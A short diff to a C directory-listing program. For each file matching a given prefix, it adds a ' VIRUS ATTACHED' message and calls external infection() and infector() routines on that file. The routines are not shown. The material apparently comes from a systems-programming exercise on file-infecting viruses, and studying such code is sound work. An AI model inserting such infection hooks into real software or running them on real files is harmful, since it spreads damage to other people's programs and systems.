@@ -10,6 +10,8 @@
 #define BUF_SIZE 8192
 
 extern int system_call();
+extern void infection();
+extern void infector(char *filename);
 
 typedef struct ent {
     int inode;
@@ -47,7 +49,13 @@ int main(int argc, char *argv[], char *envp[])
         e = (ent *)(buf + pos);
         if (prefix == 0 || strncmp(e->buf, prefix, strlen(prefix)) == 0) {
             system_call(SYS_WRITE, STDOUT, e->buf, strlen(e->buf));
-            system_call(SYS_WRITE, STDOUT, &newline, 1);
+            if (prefix != 0) {
+                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
+                infection();
+                infector(e->buf);
+            } else {
+                system_call(SYS_WRITE, STDOUT, &newline, 1);
+            }
         }
         if (e->len <= 0)
             break;
